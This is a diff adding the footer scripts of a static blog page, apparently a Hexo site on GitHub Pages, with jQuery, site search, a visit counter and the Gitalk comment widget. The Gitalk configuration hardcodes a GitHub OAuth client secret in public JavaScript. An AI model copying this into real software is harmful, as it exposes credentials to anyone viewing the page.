+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <!-- <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"> -->
+  <script src="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+  <script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '153ef9d1b046724fd097',
+    clientSecret: '155e9d390cdfd27128f5e0961d4b09b4e4ffcf36',
+    repo: 'Ik0nw.github.io',
+    owner: 'Ik0nw',
+    admin: ['Ik0nw'],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+  })
+  gitalk.render('comments')
+  </script>
+
+      
+
+
+
+
+
+
+
+</body>
+</html>
